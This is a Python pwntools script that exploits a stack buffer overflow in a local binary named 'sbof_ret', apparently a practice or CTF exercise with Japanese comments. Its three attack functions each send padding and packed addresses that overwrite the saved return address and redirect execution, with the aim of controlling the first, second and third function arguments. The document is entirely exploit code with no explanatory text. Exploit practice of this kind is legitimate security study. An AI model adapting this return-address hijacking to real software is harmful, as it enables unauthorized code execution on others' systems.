#!/usr/bin/env python3
from pwn import *
import sys
import struct

bin_file = './sbof_ret'
context(os = 'linux', arch = 'amd64')

context.binary = bin_file
context.terminal = ['bash', 'splitw', '-h']  # 環境に応じて変えてください
context.log_level = 'debug'  # または 'info'

binf = ELF(bin_file)
rop = ROP(binf)

# 第一引数書き換え
def attack_35_27(conn, **kwargs):
    exploit =  b'a' * 0x10
    exploit += struct.pack('<QQQQ', 0xdeadbeef, 0x401288, 0xcafebabe, 0x4011da)
    conn.sendline(exploit)
    print(conn.recvall().decode())

# 第二引数書き換え
def attack_35_27_2(conn, **kwargs):
    exploit =  b'a' * 0x10
    exploit += struct.pack('<QQQQ', 0xdeadbeef, 0x401290, 0xcafebabe, 0x4011da)
    conn.sendline(exploit)
    print(conn.recvall().decode())

# 第三引数書き換え
def attack_35_27_3(conn, **kwargs):
    exploit =  b'a' * 0x10
    exploit += struct.pack('<QQQQ', 0xdeadbeef, 0x401298, 0xcafebabe, 0x4011da)
    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():
    print('### attack_35_27 ###')
    conn = process(bin_file)
    attack_35_27(conn)
    
    print('### attack_35_27_2 ###')
    conn = process(bin_file)
    attack_35_27_2(conn)
    
    print('### attack_35_27_3 ###')
    conn = process(bin_file)
    attack_35_27_3(conn)

if __name__=='__main__':
    main()
